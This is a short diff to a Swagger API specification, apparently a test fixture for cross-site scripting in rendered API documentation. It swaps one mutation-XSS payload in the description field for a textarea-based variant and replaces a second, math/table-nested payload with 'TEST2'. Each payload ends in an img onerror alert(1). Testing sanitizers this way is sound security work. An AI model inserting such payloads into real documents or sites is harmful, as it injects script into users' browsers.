@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <svg><annotation-xml><foreignobject><style><!--</style><p id="--><img src='x' onerror='alert(1)'>">
+    <svg><annotation-xml><foreignobject><textarea><!--</textarea><p id="--><img src='x' onerror='alert(1)'>">
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-              <math><mtext><table><mglyph><textarea><math><table id=”</table>”><img src onerror=alert(1)”>
+              TEST2
 
           format: int64
           in: path
